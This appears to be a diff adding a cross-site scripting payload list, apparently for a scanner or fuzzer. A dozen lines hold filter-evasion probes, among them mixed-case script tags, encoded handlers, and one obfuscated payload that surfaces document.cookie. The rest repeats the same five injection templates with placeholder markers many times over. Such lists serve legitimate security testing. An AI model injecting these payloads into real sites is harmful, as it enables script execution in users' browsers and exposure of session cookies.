@@ -1,0 +1,112 @@
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+"<script>alert(1)</script>"
+<img src=x oNerRor=alert(1)>
+"<script>alert(1)</script>"
+"%3Cscript%3Ealert(1)%3C/script%3E"
+"<ScRiPt>alert(1)</ScRiPt>"
+"<img src=x onerror=alert(1)>"
+"\" ><img src=x OnErRoR=alert(1)>"
+"onmouseover=\"alert(1)\""
+"\" onload=\"String.fromCharCode(97,108,101,114,116,40,49,41)\""
+"<div style=\"xss:expression(alert(1))\">"
+"<input value=\"\"><script>alert(1)</script>"
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<script>window['co'+'nsole']['lo'+'g']('VENOM-b8b8af06')</script>
+<img src=x onerror=VENOM-9314928b>
+%22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
+<svg/onload=VENOM-aa71c88c>
+jaVasCript:VENOM-540e01a9
+<ScrIpT>VENOM-f17cc551</ScRiPt>
+<script>/*VENOM-c822e212*/VENOM-5a17b391</script>
+<img src="x" onerror="VENOM-e2420e2e">
